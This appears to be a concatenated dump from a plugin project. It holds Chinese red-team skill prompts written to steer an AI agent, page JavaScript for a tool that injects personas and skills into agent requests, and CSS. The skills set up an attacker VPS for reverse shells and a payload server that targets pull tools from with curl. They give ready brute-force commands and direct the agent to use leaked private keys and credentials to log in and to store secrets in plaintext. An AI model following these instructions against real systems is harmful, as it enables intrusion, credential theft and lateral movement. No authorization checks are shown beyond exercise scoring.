    "text": "# 首次使用引导（把环境一次配齐）\n\n**触发条件**（满足任一即执行本技能，不要跳过）：\n- `redteam_preflight` 返回里 `onboarding.complete=false`；\n- preflight 有 `broken` 技能且原因是\"缺环境变量\"或\"VPS 还是占位符\"；\n- 用户第一次进红队模式、或明确说\"环境/工具没配好\"。\n\n**核心原则**：**一次性把话说完，一次要齐**。不要挤牙膏式反复找用户要东西——那是这套引导存在的唯一理由。\n\n## 一、先确认你有没有\"工具箱\"（npm 版默认没有）\n\nnpm 版 `dsh-redteam-mode` **不随包分发工具安装脚本与 9 份攻击链技能**（隧道 / 凭据 /\nWebShell / 反弹 Shell / 横向移动 / 未授权利用）。原因：npm 的发布期自动审查会把\n\"包在安装后自动下载渗透二进制\"判定为恶意行为特征，整包会被 Blocked。\n\n- **有** `$DSH_HOME/redteam/setup.sh`（自行取过工具箱、或非 npm 安装）→ 按下面第一、二节走；\n- **没有**（`redteam_preflight` 返回里 `onboarding.setup_script.exists=false`）→ 先去项目\n  GitHub Release 下载 `dsh-redteam-mode-<版本>-toolkit.tar.gz`，解压后按其中 README\n  **由用户自己执行**，再到第三节手动配 `FOFA_KEY` 与 VPS；\n- **都不要**也行：只用本包自带的 14 个侦察/检测向技能（`fofa-recon` / `active-scan` /\n  `nuclei-scan` / `web-fingerprint` / `dir-bruteforce` 等）也能开工，只是拿不到需要落地的成果。\n\n> **红线**：本插件**不替用户下载或安装任何安全工具**。需要什么，说清获取位置，由用户自己取、自己执行。\n\n## 二、要用户提供什么（一次列清，说清\"为什么\"和\"给到哪\"）\n\n| 要什么 | 为什么必须 | 给到哪 | 没有会怎样 |\n| --- | --- | --- | --- |\n| **FOFA_KEY** | 资产测绘（`fofa-recon`）靠它铺开单位互联网资产面；没有就只能靠 crt.sh + 子域枚举，**边缘资产与未备案资产会大量漏掉** | 环境变量 `FOFA_KEY`，或写进 `$DSH_HOME/.env`（脚本会代写） | 测绘能力降级：找不全资产 → 后面四个阶段都受影响 |\n| **VPS 登录方式**（`user@ip` + 私钥路径） | 反弹 Shell 必须落到**公网可控主机**上；载荷投递、隧道中转也依赖它 | `REDTEAM_VPS_HOST`（`用户@主机`）/ `REDTEAM_VPS_KEY`（私钥路径，默认 `$DSH_HOME/redteam/toolkit/vps/id_rsa`） | 拿不到服务器权限、投递不了载荷、进不了内网 |\n| （可选）测绘平台 key | Quake / Hunter / ZoomEye 与 FOFA 结果差异大，交叉能多找出资产 | 环境变量，按需 | 少一路交叉验证 |\n| （可选）允许 apt 安装 | 补系统工具 | 用户自己执行 `sudo apt install …` | 相关技能降级 |\n\n**话术要求**：列完后**等用户补齐**。不要用\"我先用降级方案开工\"糊过去——除非用户明确说\"就按现有条件打\"。\n\n**注意**：用户的 key **不要写进仓库、不要贴进报告、不要在 `redteam_chain_add` 的 `tool` 字段里出现**。\n写进 `$DSH_HOME/.env`（脚本已 `chmod 600`）即可。\n\n### FOFA_KEY 怎么拿（要能指导用户）\n1. 登录 <https://fofa.info> → 右上角头像 → **个人中心 → API Key**；\n2. 个人版限额：10,000 次查询/月、1 秒 1 次并发（**脚本与技能都按 1 秒 1 次限速，不要调高**，超了会触发 45012 封禁）；\n3. 拿到后可以自测：`curl -s \"https://fofa.info/api/v1/info/my?key=<KEY>\"` —— 返回 `\"error\":false` 即有效。\n\n### VPS 怎么准备（要能指导用户）\n- 一台**公网可达**的 Linux VPS（1 核 1G 够用），安全组放行：`22`（SSH）、`9000-9999`（反弹 Shell 监听段）、`9100`（载荷分发）；\n- 生成/放置 SSH 私钥到 `$DSH_HOME/redteam/toolkit/vps/id_rsa`，权限必须 `chmod 600`；\n- 确认连通：`ssh -i <私钥> <user>@<ip> 'echo ok'`；\n- **载荷分发服务**：VPS 上 `~/payload` 目录 + `python3 -m http.server 9100`（tmux 常驻），\n  目标机可 `curl http://<ip>:9100/fscan` 直接拉工具。\n\n## 三、配置完的验证（必须做完才算引导成功）\n\n逐项实测，**不要只看\"文件存在\"**：\n\n```bash\n# 1) FOFA key 有效\ncurl -s \"https://fofa.info/api/v1/info/my?key=$FOFA_KEY\" | grep -o '\"error\":[a-z]*'\n\n# 2) VPS 可达（载荷服务是否在跑由工具箱的体检脚本负责）\nssh -i $DSH_HOME/redteam/toolkit/vps/id_rsa -o BatchMode=yes <user>@<ip> 'echo ok'\n\n# 3) 技能注册表可见\n#    用 redteam_preflight 复核，看 available 列表里实际有哪些技能\n```\n\n> 工具二进制与 nuclei 模板库的体检由工具箱里的 `redteam-setup.sh --check` 负责\n> （npm 版不含该脚本，见第一节）。\n## 四、最后一步：写完成标记并复核\n\n配置补齐后，写完成标记（有工具箱脚本时脚本 `--yes` 会自动写；没有就手动写）：\n\n```bash\nmkdir -p \"$DSH_HOME/redteam\" && date -Is > \"$DSH_HOME/redteam/.setup-complete\"\n```\n\n然后**再跑一次 `redteam_preflight`**，确认：`onboarding.complete=true`、`broken` 为空或只剩用户明确接受降级的项。\n把最终结论按\"能用什么 / 缺什么 / 缺的影响是什么\"三条报给用户。\n\n**改了 `$DSH_HOME/.env` 后必须重启 dsh web**，否则当前进程读不到新的环境变量——\n这一步要明确告诉用户（智能体不能替他重启）。\n\n## 五、用户就是不给某些资源时（降级口径）\n\n| 缺什么 | 降级方案 | 必须向用户说明的限制 |\n| --- | --- | --- |\n| FOFA_KEY | crt.sh 证书透明 + `passive-recon` + `recon-pipeline`（subfinder/ksubdomain/dnsx）+ 搜索引擎与备案信息 | **资产收集不完整**，未备案/边缘资产会漏；得分上限受影响 |\n| VPS | 只做不需要落地的成果（账号权限、数据、未授权访问、WebShell 交付） | **拿不到服务器权限、进不了内网**，`boundary`/`internal`/`central-system` 类得分点基本放弃 |\n| 系统工具（nuclei 等） | 用工具箱里的替代品（httpx/subfinder 仍在） | 漏洞发现能力大幅下降，Nday 检测基本瘫痪 |\n| 全部都没有 | 只做纯被动信息收集与资产梳理 | 明确告诉用户\"这次只能做到信息收集阶段\" |\n\n**降级决定要写进汇报**：用户需要知道这次是在什么条件下打的。"

    "chars": 4423,
    "injectable": true,
    "builtin": true,
    "text": "# 目录与文件爆破（找入口的主力）\n\n**实战里大部分入口不是 CVE 打进去的，是目录爆破扫出来的**：后台 `/admin`、备份 `www.zip`、配置 `.env`、\n源码 `.git/`、接口文档 `swagger-ui.html`、上传点、调试页、actuator/druid 监控台。\n本技能覆盖本机已就位的四个工具，**不要只用一个**——它们的字典与判定逻辑不同，互补。\n\n## 本机工具\n\n| 工具 | 路径 | 版本 | 特点 |\n| --- | --- | --- | --- |\n| **feroxbuster** | `/usr/bin/feroxbuster` | 2.13.1 | Rust，递归爆破最强，自动跟随目录层级，**首选** |\n| **ffuf** | `/usr/bin/ffuf` | 2.1.0-dev | 最快、最灵活，支持多字典/vhost/参数 fuzz |\n| **dirsearch** | `$DSH_HOME/redteam/toolkit/dirsearch/dirsearch` | v0.5.0 | Python。`setup.sh` 不下载，需自行放到该路径 |\n| **gobuster** | `/usr/bin/gobuster` | — | 轻量稳定，dir/dns/vhost 三模式 |\n\n## 一、feroxbuster（首选：递归 + 自动过滤）\n\n```bash\nferoxbuster -u https://target.example.com \\\n  -w /usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt \\\n  -x php,asp,aspx,jsp,html,js,zip,tar.gz,bak,sql,txt,xml,json,config \\\n  -d 3 -t 30 --rate-limit 80 --timeout 10 \\\n  --filter-status 404 --filter-size 0 \\\n  -o runs/ferox-target.txt --json -o runs/ferox-target.json\n```\n\n要点：`-d 3`（递归深度）别开太大；`--rate-limit` 交给服务器喘气；`-x` 后缀表必须带**备份与配置类**。\n\n## 二、ffuf（最快，多字典 / vhost / 参数）\n\n```bash\n# 目录与文件（两轮：先目录，再按命中的目录加后缀）\nffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \\\n  -mc 200,204,301,302,307,401,403,500 -fc 404 -t 40 -rate 80 -timeout 10 \\\n  -o runs/ffuf-dir.json -of json\n\n# 敏感文件（备份/配置/源码/密钥）\nffuf -u https://target/FUZZ -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \\\n  -mc all -fc 404 -t 40 -o runs/ffuf-quick.json -of json\n\n# vhost 虚拟主机发现（同 IP 多站点，边缘资产常从这里出来）\nffuf -u https://target/ -H \"Host: FUZZ.example.com\" \\\n  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \\\n  -fs 0 -mc all -t 50 -o runs/ffuf-vhost.json -of json\n```\n\n## 三、dirsearch（字典全，适合补漏）\n\n```bash\n$DSH_HOME/redteam/toolkit/dirsearch/dirsearch \\\n  -u https://target.example.com -e php,asp,aspx,jsp,zip,bak,txt,sql,json \\\n  --random-agent -t 30 --delay 0.1 --exclude-status 404 \\\n  -r -R 3 --format json -o runs/dirsearch-target.json\n```\n\n## 四、gobuster（轻量兜底）\n\n```bash\ngobuster dir -u https://target -w /usr/share/seclists/Discovery/Web-Content/common.txt \\\n  -x php,asp,aspx,jsp,zip,bak -t 30 -k -o runs/gobuster-target.txt\n```\n\n## 字典（本机已有，优先用这些）\n\n| 用途 | 路径 |\n| --- | --- |\n| 大目录字典 | `/usr/share/seclists/Discovery/Web-Content/raft-large-directories.txt` |\n| 中目录字典 | `/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt` |\n| 常见文件 | `/usr/share/seclists/Discovery/Web-Content/common.txt` |\n| 敏感文件（quickhits） | `/usr/share/seclists/Discovery/Web-Content/quickhits.txt` |\n| 子域（vhost 用） | `/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt` |\n\n字典目录：`/usr/share/seclists`、`/usr/share/wordlists`。**缺字典时**用 `redteam_credential_list` 里已收集的\n单位词（品牌名、拼音缩写）自造小字典——针对性字典命中率往往高于通用大字典。\n\n## 重点目标（扫到就要跟到底）\n\n| 命中 | 下一步 |\n| --- | --- |\n| `/admin`、`/manage`、`/login`、后台路径 | 交给账号权限路线：默认口令/弱口令（技能 `credential-attack`） |\n| `.git/`、`.svn/`、`.env`、`config.php.bak`、`www.zip`、`web.rar` | **源码与配置泄露**：拉下来找数据库连接串、密钥、硬编码账号 → `redteam_credential_add` |\n| `swagger-ui.html`、`/v2/api-docs`、`/openapi.json` | 提取全量接口清单 → 未授权与越权探测（技能 `unauth-exploit`） |\n| `actuator`、`druid`、`/console`、`/jmx` | 未授权监控台，常直通 RCE 或数据库 |\n| 上传点、导入、备份恢复、模板/报表设计 | 交给漏洞利用角色串 getshell 链 |\n| `.ssh/`、`id_rsa`、`*.pem`、`*.jks` | 私钥泄露 → 直接尝试登录（`ssh -i`） |\n\n## 降噪与自保\n\n1. **必须先过滤 404 的软 404**：先请求一个不存在的随机路径，看返回状态码与响应长度，用它做 `--filter-size` / `-fs`。\n2. **限速**：`-rate 80` / `--delay 0.1` / `-t 30` 起步；被 WAF 拦（大量 403/429）先降到 5–10 req/s。\n3. **别碰危险路径**：`/logout`、`/reboot`、`/shutdown`、`/delete*`、`/reset*` 这类会改状态的不要爆破，\n   字典里遇到也要排除（会造成业务中断，且演练记分不认）。\n4. **被封 >3 次放弃**该资产（`redteam_asset_test` status=abandoned + blocked=true），转下一个。\n5. **内网目标走隧道**：feroxbuster `--proxy socks5://127.0.0.1:1080`、ffuf `-x socks5://127.0.0.1:1080`\n   （技能 `suo5-tunnel`）。\n\n## 输出与落库（强制）\n\n1. **隐藏路径本身不是得分项**，但**每个拿到东西的路径都要落库**：\n   - 找到后台/上传点/接口文档 → 记进该资产 `redteam_asset_test` 的 `surface`（追加式），交给漏洞发现/利用的下一个动作；\n   - 泄露源码/配置/密钥/凭据 → `redteam_credential_add`（`source=配置泄露`，`tool` 写路径与命令，明文写 `secret_value`）；\n   - 未授权可访问的接口/监控台 → 直接 `redteam_vuln_add`（含 `evidence` 回显）+ `redteam_http_evidence_add`。\n2. 每个关键动作 `redteam_chain_add`：`stage_code=internet`（或 `internal`），\n   `tool` 写实际命令原文（例如 `feroxbuster -u https://target -w raft-large-directories.txt -x php,zip,bak -d 3 --rate-limit 80`），\n   `result` 写命中摘要（例如 `命中 /admin/、/backup/www.zip、/.env`）。\n3. 跑完立刻 `redteam_asset_test` 回写 `status`/`test`/`surface`——不写状态后面的人一定重复扫。\n4. 字典与结果文件一律放 `runs/`（报告要能复现）。"

     没有它，更新插件后浏览器可能一直用缓存的旧 app.js / style.css。 -->
<script>
// 页面侧的「这次到底注不注入」判定。
//
// 为什么页面要自己算一遍：后端只在有请求经过网关时才重扫并写快照。
// 用户在页面上改完模式/人设/技能，只要还没发起 agent 请求，快照就一直是旧的——
// 状态条说「等重扫」、点技能看着没反应、装配面板空着，全是这一件事引起的。
//
// 这里的规则必须与 lib/plan.mjs 一致（Node 侧用它决定真改不改请求）。
// 两边不同步的话，页面会答应一件网关不会做的事——所以 tests/plan-parity.test.mjs
// 拿同一批输入分别跑两边，逐个比结果。
//
// 与 lib/plan.mjs 的唯一差别：这里不含 agent-purge 那一层。
// 页面读不到 state.json，useAgentPurge 打开时由调用方改用快照里的 plan。
;(() => {
  const MODES = ['off', 'strict', 'replace', 'append']

  const blank = (modeFrom, mode, blocked, blockedCode) => ({
    mode: mode || 'off',
    modeFrom,
    personaId: '',
    personaName: '',
    personaFrom: '',
    skills: [],
    blocked,
    blockedCode: blockedCode || '',
    ready: false,
    missingPersona: '',
  })

  /**
   * applyPrefs 与 lib/plan.mjs 的同名函数同语义：
   * 把「改过的正文」和「删掉的条目」套回列表。
   * 页面写不了磁盘，编辑与删除都只能存在 options 里，由网关侧照同一套规则套用。
   */
  function applyPrefs(entries = [], options = {}) {
    const ov = options && typeof options.overrides === 'object' && options.overrides ? options.overrides : {}
    const rm = options && typeof options.removed === 'object' && options.removed ? options.removed : {}
    return entries
      .filter((e) => e && typeof e.id === 'string' && rm[e.id] !== true)
      .map((e) => {
        const edited = ov[e.id]
        return typeof edited === 'string' && edited.trim() ? { ...e, text: edited, edited: true } : e
      })
  }

  /** resolve 与 lib/plan.mjs 同语义：页面设置优先，人设优先标了 default 的底座人设。 */
  function resolve({ options = {}, entries = [] } = {}) {
    const pageMode = MODES.includes(options.mode) ? options.mode : ''
    const mode = pageMode || 'off'
    const modeFrom = pageMode ? 'page' : 'default'

    const byId = new Map()
    for (const e of entries) if (e && typeof e.id === 'string' && !byId.has(e.id)) byId.set(e.id, e)
    const personas = entries.filter((e) => e.kind === 'persona')

    // 人设的解析放在「注入关着」之前：关掉注入只是「这次不写请求」，
    // 用户选了哪位人设这件事没变。先返回的话 personaId 是空串，
    // 列表里每条人设都显示「未启用」，点它也就看着毫无反应。
    if (mode === 'off') {
      const picked = personas.find((e) => e.id === (typeof options.persona === 'string' ? options.persona.trim() : ''))
        || personas.find((e) => e.default === true && options.enabled?.[e.id] !== false)
        || personas.find((e) => e.builtin !== true && options.enabled?.[e.id] !== false)
      return {
        ...blank(modeFrom, mode, '', modeFrom === 'default' ? 'no-mode' : 'mode-off'),
        // blank 的第三个参数是「被挡住的文案」，不是 personaId，所以人设得另塞
        personaId: picked?.id || '',
        blocked: modeFrom === 'default'
          ? '注入是关的：请求原样放行。按右侧「开始注入」才会改写请求'
          : '当前模式是 off，请求原样放行',
      }
    }

    let personaId = ''
    let personaFrom = ''
    let missingPersona = ''
    const pagePersona = typeof options.persona === 'string' ? options.persona.trim() : ''
    if (pagePersona && byId.has(pagePersona)) {
      personaId = pagePersona
      personaFrom = 'page'
    } else if (pagePersona) {
      missingPersona = pagePersona
    } else {
      const fallback =
        personas.find((e) => e.default === true && options.enabled?.[e.id] !== false) ||
        personas.find((e) => e.builtin !== true && options.enabled?.[e.id] !== false)
      if (fallback) {
        personaId = fallback.id
        personaFrom = 'auto'
      }
    }

    if (!personaId) {
      if (missingPersona) {
        const names = personas.slice(0, 4).map((e) => e.name || e.id).join('、')
        return {
          ...blank(modeFrom, mode, '', 'persona-missing'),
          blocked: names
            ? `指定的「${missingPersona}」已经不在了：现在可用的有 ${names}${personas.length > 4 ? ' 等' : ''}`
            : `指定的「${missingPersona}」已经不在了，来源里也还没有其它人设`,
          missingPersona,
        }
      }
      const why = personas.length
        ? '还没有选人设：左边挑一条「人设」点"设为当前人设"'
        : '来源里还没有人设（.md）：导入一份试试'
      return { ...blank(modeFrom, mode, '', personas.length ? 'no-persona' : 'no-persona-file'), blocked: why }
    }

    const persona = byId.get(personaId)
    const skills = entries
      .filter((e) => e.kind !== 'persona' && options.enabled?.[e.id] === true)
      .map((e) => ({ id: e.id, name: e.name, text: e.text }))

    return {
      mode,
      modeFrom,
      personaId,
      personaName: persona?.name || personaId,
      personaFrom,
      skills,
      blocked: '',
      blockedCode: '',
      ready: true,
    }
  }

  globalThis.PurgePlan = { resolve, applyPrefs, MODES }
})()

<style>
/* 破甲 · Purge 的页面样式。
   颜色一律吃 magpie 自己的主题变量（--magpie-*），没给就用中和的回落值：
   页面在 magpie 窗口里，跟随宿主明暗是硬要求。

   没有按「六种类型各给一个颜色」上色——那会变成彩虹。
   只留三类语义色（人设 / 技能 / 素材），其余全部让给墨色与分隔线。 */
:root {
  --ink: var(--magpie-fg, #1c1d21);
  --muted: var(--magpie-muted, #6b7280);
  --bg: var(--magpie-bg, #fbfbf9);
  --card: var(--magpie-card, #ffffff);
  --line: var(--magpie-line, #e3e3e6);
  --mono: var(--magpie-code, ui-monospace, "Cascadia Mono", "SF Mono", Menlo, monospace);

  /* 语义色：人设莓红 / 技能石板青 / 强调莓红（原先是紫 + 青蓝）。
     下面三组是深色主题下的值；浅色主题在文件末尾有另一套更沉的，
     同一套色相在浅底上不压深就会糊成一片。 */
  --kind-persona: #c06076;
  --kind-skill: #4f8895;
  --kind-material: #8a7f70;
  --accent: #b04d66;
  --ok: #2f8f5b;
  --danger: #c25556;

  /* 选中态与焦点环一律用中性色，不用强调色。
     强调色留给「真的要按」的动作（确认注入、保存），
     到处都是紫色高亮时，反而看不出哪个才是主操作，而且很吵。 */
  --focus: color-mix(in oklab, var(--ink) 45%, transparent);
  --selected: color-mix(in oklab, var(--ink) 8%, transparent);
}

/* 浅色主题：同一套色相往深里压一档。
   莓红与石板青在浅底上原样用会发灰、对比度掉到看不清，
   所以整体下沉，而不是换一套颜色。 */
[data-theme="light"] {
  --kind-persona: #a03e55;
  --kind-skill: #2f6b76;
  --accent: #8f3350;
}
/* 宿主没给 data-theme 时，按系统偏好兜底 */
@media (prefers-color-scheme: light) {
  :root:not([data-theme="dark"]) {
    --kind-persona: #a03e55;
    --kind-skill: #2f6b76;
    --accent: #8f3350;
  }
}

* { box-sizing: border-box; }
html { background: var(--bg); color: var(--ink); }
body {
  margin: 0;
  padding: 20px 24px calc(40px + env(safe-area-inset-bottom));
  font: 13px/1.55 var(--magpie-font, -apple-system, "Segoe UI", "Noto Sans SC", system-ui, sans-serif);
  max-width: 1160px;
  touch-action: manipulation;
  -webkit-font-smoothing: antialiased;
}

/* ---------- 嵌入布局：按实际可用高度铺满，整页不滚 ---------- */
/* magpie 把插件页放在一个固定高度的面板里。用 vh 算高度会撞上「面板比视口矮」，
   于是页面自己长出一条滚动条，两层滚动叠在一起很难用。
   这里改成：body 撑满 100%，上下固定，中间那块吃剩余高度并在内部滚。 */
@media (min-width: 901px) {
  /* 用 clip 而不是 hidden：这里是「这块本来就不该滚」，不是「临时锁住」。
     hidden 会造出一个 scrollTop 恒为 0 的滚动容器，滚动位置和焦点滚入都会打架；
     clip 直接不产生滚动容器。 */
  html, body { height: 100%; overflow: clip; }
  body {
    display: flex;
    flex-direction: column;
    padding: 16px 20px calc(12px + env(safe-area-inset-bottom));
    /* 嵌入宽度通常比 1160 宽，不再居中留白，把空间还给两栏 */
    max-width: none;
  }
  .top, .plan, .foot { flex: none; }
  .work { flex: 1 1 auto; min-height: 0; }
}

/* ---------- 顶部 ---------- */
/* 只剩品牌：模式选择与确认按钮都并进了下面的状态条。
   顶部原来那排（选择器 + 说明 + 重新扫描）占了首屏最贵的一行，
   说的却是同一件事——「这次注不注」，所以它们该在同一行里。 */
.top {
  display: flex;
  align-items: center;
  gap: 12px;
  min-width: 0;
}
.brand { display: flex; align-items: center; gap: 12px; min-width: 0; }
.mark { width: 28px; height: 28px; flex: none; border-radius: 8px; }
.brand-text { min-width: 0; }
h1 {
  margin: 0;
  font-size: 21px;
  font-weight: 620;
  letter-spacing: .005em;
  line-height: 1.2;
  white-space: nowrap;
}
.brand-tail {
  font-weight: 400;
  color: var(--muted);
  margin-left: 2px;
}
.tagline { margin: 2px 0 0; color: var(--muted); font-size: 12px; }

.field { display: grid; gap: 4px; }
.field-label { font-size: 12px; color: var(--muted); }

/* ---------- 控件 ---------- */
button {
  font: inherit;
  color: var(--ink);
  background: var(--card);
  border: 1px solid var(--line);
  border-radius: 8px;
  padding: 5px 12px;
  min-height: 30px;
  cursor: pointer;
  transition: border-color .12s ease, background-color .12s ease;
}
button:hover:not(:disabled) { border-color: var(--muted); }
button:disabled { opacity: .5; cursor: default; }
button.primary { background: var(--accent); border-color: transparent; color: #fff; }
button.quiet { background: transparent; }
button.danger { color: var(--danger); border-color: color-mix(in oklab, var(--danger) 40%, var(--line)); }

select, input[type="search"], input[type="text"], textarea {
  font: inherit;
  color: var(--ink);
  background: var(--card);
  border: 1px solid var(--line);
  border-radius: 8px;
  padding: 5px 9px;
}
@media (max-width: 620px) { select, input, textarea { font-size: 16px; } }
textarea { width: 100%; resize: vertical; font-family: var(--mono); font-size: 12px; line-height: 1.6; }
/* 焦点环用中性墨色而不是强调色：到处一圈紫会把「哪个才是主操作」冲淡。
   只走键盘时才出现，鼠标点不亮——这是 :focus-visible 的本意。 */
:focus-visible { outline: 2px solid var(--focus); outline-offset: 2px; }

/* ---------- 注入状态：整页最该被看见的一行 ---------- */
/* 一行里说完：注不注（点+结论）、为什么（第二行小字）、怎么注（胶囊组）。
   形态从「大胶囊」改成「带左侧色条的横条」：胶囊是卡片语汇，而这行本质是
   一条状态指示，用色条更快——颜色本身就是结论，不用读字。 */
.plan {
  position: relative;
  display: flex;
  flex-wrap: wrap;
  align-items: center;
  gap: 6px 12px;
  margin: 14px 0 16px;
  padding: 9px 16px;
  border: 1px solid var(--line);
  border-left: 3px solid var(--muted);
  border-radius: 10px;
  background: color-mix(in oklab, var(--card) 55%, transparent);
}
.plan[data-state="ready"] { border-left-color: var(--ok); }
.plan[data-state="blocked"] { border-left-color: var(--danger); }
/* 点跟第一行文字对齐（居中到整块），不贴顶 */
.plan .dot { width: 8px; height: 8px; border-radius: 50%; background: var(--muted); flex: none; align-self: center; margin-top: 0; }
.plan[data-state="ready"] .dot { background: var(--ok); }
.plan[data-state="blocked"] .dot { background: var(--danger); }

/* 两行文字一列：结论在上（正文字号）、依据在下（小一号），左边缘对齐成一段话。 */
.plan .plan-text { display: grid; gap: 1px; flex: 1 1 auto; min-width: 0; }
.plan .who { font-size: 14.5px; font-weight: 560; line-height: 1.4; min-width: 0; }
.plan .who.is-empty { color: var(--muted); font-weight: 400; }
.plan .why { color: var(--muted); font-size: 12px; line-height: 1.4; min-width: 0; overflow-wrap: anywhere; }

/* ---------- 胶囊组：模式 + 确认 ---------- */
/* 两段拼成一颗胶囊：中间用一条竖线分，外圈只有一个圆角轮廓。
   分成两颗各自带边框的胶囊，看起来像两个不相干的按钮。 */
.plan-controls {
  display: inline-flex;
  align-items: stretch;
  flex: none;
  border: 1px solid color-mix(in oklab, var(--line) 70%, var(--muted));
  border-radius: 999px;
  background: transparent;
  overflow: hidden;
  transition: border-color .12s ease;
}
.plan-controls:hover { border-color: color-mix(in oklab, var(--muted) 60%, var(--line)); }
/* 键盘走到这里才亮：整颗胶囊一圈，不在单段里画 */

/* 一段共用的底：没有自己的边框，靠容器的圆角裁切。
   扁一点、宽一点：高度 26，水平内边距 14——胶囊的圆润来自「宽高比」，不是圆角数值。 */
.seg {
  position: relative;
  display: inline-flex;
  align-items: center;
  gap: 6px;
  min-height: 24px;
  padding: 0 14px;
  border: 0;
  /* 圆角一律交给外层容器裁：按钮默认带的 8px 圆角会让右端比左端更方，
     两端不对称，看着就不圆润。 */
  border-radius: 0;
  background: transparent;
  color: var(--ink);
  font: inherit;
  font-size: 12px;
  line-height: 1.5;
  white-space: nowrap;
  cursor: pointer;
  transition: background-color .12s ease, color .12s ease;
}
.seg + .seg { border-left: 1px solid var(--line); }
.seg:hover { background: color-mix(in oklab, var(--card) 70%, transparent); }

.seg-key { color: var(--muted); }
.seg-value { color: var(--ink); }

/* 箭头用 svg 自己画：位置由 padding 决定，和文字基线、圆角都能对齐；
   原生 select 的箭头永远贴在自己内容盒里，这是它一直看着别扭的原因。
   展开时翻 180°：告诉人「再点一下是收起」，也把「刚才点到了」这件事反馈出来。 */
.seg-chev {
  width: 12px;
  height: 12px;
  flex: none;
  color: var(--muted);
  margin-left: -1px;
  transition: transform .16s cubic-bezier(.32, .72, 0, 1);
}
.seg-mode[aria-expanded="true"] .seg-chev { transform: rotate(180deg); }
/* 开启注入期间模式被锁：箭头淡掉、鼠标恢复默认。
   不给「可点」的暗示，比点了再弹一句提示好。 */
.seg-mode.is-locked { cursor: default; }
.seg-mode.is-locked .seg-value { color: var(--muted); }
.seg-mode.is-locked .seg-chev { opacity: .3; }
.seg-mode.is-locked:hover { background: transparent; }


/* ---------- 模式下拉面板 ---------- */
/* 自绘而不是用系统弹层：系统的下拉板颜色、圆角、间距都改不动，
   深色主题下会突然弹出一块浅色板。面板浮在胶囊组下面，右对齐。 */
.seg-menu {
  position: absolute;
  top: calc(100% - 6px);
  right: 14px;
  z-index: 20;
  min-width: 248px;
  padding: 5px;
  border: 1px solid var(--line);
  border-radius: 12px;
  background: var(--card);
  box-shadow: 0 10px 28px -12px rgba(0, 0, 0, .55), 0 2px 6px -2px rgba(0, 0, 0, .3);
}

.seg-opt {
  display: flex;
  align-items: flex-start;
  gap: 10px;
  width: 100%;
  padding: 7px 10px;
  border: 0;
  border-radius: 8px;
  background: transparent;
  color: var(--ink);
  font: inherit;
  text-align: left;
  cursor: pointer;
}
.seg-opt:hover { background: color-mix(in oklab, var(--card) 60%, var(--line)); }
.seg-opt.is-on { background: var(--selected); }
.seg-opt-body { display: grid; gap: 1px; min-width: 0; flex: 1 1 auto; }
.seg-opt-name { font-size: 12.5px; font-weight: 520; }
.seg-opt-sub {
  font-size: 12px;
  line-height: 1.4;
  color: var(--muted);
  overflow-wrap: anywhere;
}
.seg-check {
  width: 12px;
  height: 12px;
  flex: none;
  margin-top: 3px;
  color: var(--ink);
}
.seg-opt.is-on .seg-opt-sub { color: var(--ink); }
/* 未确认：强调色提示「这里可以按」；已注入：绿底，一眼看出状态变了 */
.seg-action.is-armed { color: var(--accent); }
.seg-action.is-armed:hover { background: var(--selected); }
.seg-action.is-applied {
  background: color-mix(in oklab, var(--ok) 16%, transparent);
  color: var(--ok);
  cursor: default;
}
.seg-action.is-applied:hover { background: color-mix(in oklab, var(--ok) 20%, transparent); }

/* ---------- 主体：左列表 / 右组装 ---------- */
/* stretch 让左栏跟右栏等高：右边展开原文后会变很高，左栏若按自己内容收着，
   底下就是一大片空白。 */
.work {
  display: grid;
  grid-template-columns: minmax(280px, 340px) minmax(0, 1fr);
  gap: 24px;
  align-items: stretch;
}
@media (max-width: 900px) { .work { grid-template-columns: minmax(0, 1fr); align-items: start; } }

/* 左栏自己纵向排布，列表吃掉剩余高度 */
.rail { min-width: 0; min-height: 0; display: flex; flex-direction: column; }
.rail-tools { display: grid; gap: 10px; }
.rail-tools input { width: 100%; }
.chips { display: flex; flex-wrap: wrap; gap: 8px; }
.chip {
  font-size: 12px;
  padding: 3px 10px;
  min-height: 26px;
  border-radius: 999px;
  border: 1px solid var(--line);
  background: transparent;
  color: var(--muted);
}
.chip[aria-pressed="true"] { background: var(--selected); border-color: transparent; color: var(--ink); }
/* 上下留白让它和右栏的比例尺刻度落在同一行：两栏顶上都是「数字行」，
   一个说条数、一个说字符量，位置错开看着就是没排过。 */
.rail-count { margin: 22px 0 14px; color: var(--muted); font-size: 12px; line-height: 19px; }

/* max-content：行高必须由内容决定。
   默认的 auto 在「容器有确定高度」时会被压到分给它的空间（实测 30px 装 49px 内容），
   名字和副标题就叠在一起了。 */
.list {
  display: grid;
  grid-auto-rows: max-content;
  gap: 1px;
  border-top: 1px solid var(--line);
}
/* 桌面端：列表吃掉左栏剩下的高度，自己滚，整页不再滚。
   窄屏不做嵌套滚动——那比页面滚动难用。
   底部加一层淡出：滚动区硬切会把最后一行切成半截，看起来像坏了。 */
@media (min-width: 901px) {
  .list {
    flex: 1 1 auto;
    min-height: 0;
    overflow-y: auto;
    overscroll-behavior: contain;
    padding-bottom: 4px;
    mask-image: linear-gradient(to bottom, #000 calc(100% - 20px), transparent);
    align-content: start;

    /* 滚动条挪到左侧：右边缘留给「未启用 / 查看」那一列，滚动条压在上面会盖住按钮。
       direction:rtl 是唯一能把原生滚动条放到左边的办法，内容再用 ltr 转回来。 */
    direction: rtl;
    scrollbar-width: thin;
    /* 平时透明，hover 才显形——工作台的滚动条不该常驻占一条边 */
    scrollbar-color: transparent transparent;
  }
  .list > * { direction: ltr; }
  .list:hover { scrollbar-color: color-mix(in oklab, var(--muted) 50%, transparent) transparent; }
  .list::-webkit-scrollbar { width: 8px; }
  .list::-webkit-scrollbar-track { background: transparent; }
  .list::-webkit-scrollbar-thumb {
    background: transparent;
    border-radius: 999px;
    transition: background-color .15s ease;
  }
  .list:hover::-webkit-scrollbar-thumb,
  .list:focus-within::-webkit-scrollbar-thumb {
    background: color-mix(in oklab, var(--muted) 45%, transparent);
  }
  .list:has(> .row:last-child:first-child) { mask-image: none; }
}
/* 分节标题：既是类型标签，也是折叠开关。
   做成 sticky——23 条技能滚到一半时，抬头还能看见自己在哪一节。 */
